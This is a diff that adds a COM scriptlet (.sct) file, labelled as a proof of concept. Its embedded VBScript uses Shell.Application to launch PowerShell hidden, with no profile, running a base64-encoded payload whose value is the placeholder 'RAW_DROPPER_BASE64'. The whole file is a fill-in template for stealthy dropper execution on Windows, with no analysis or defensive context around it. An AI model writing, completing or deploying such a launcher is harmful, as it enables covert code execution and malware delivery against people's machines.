@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+<script language="VBScript">
+Dim RANDOMIZED_SHELL_NAME
+set RANDOMIZED_SHELL_NAME = CreateObject("shell.application")
+RANDOMIZED_SHELL_NAME.ShellExecute "powershell.exe", " -nop -w hidden -e RAW_DROPPER_BASE64", "", "open", 0
+</script>
+
+</registration>
+</scriptlet>
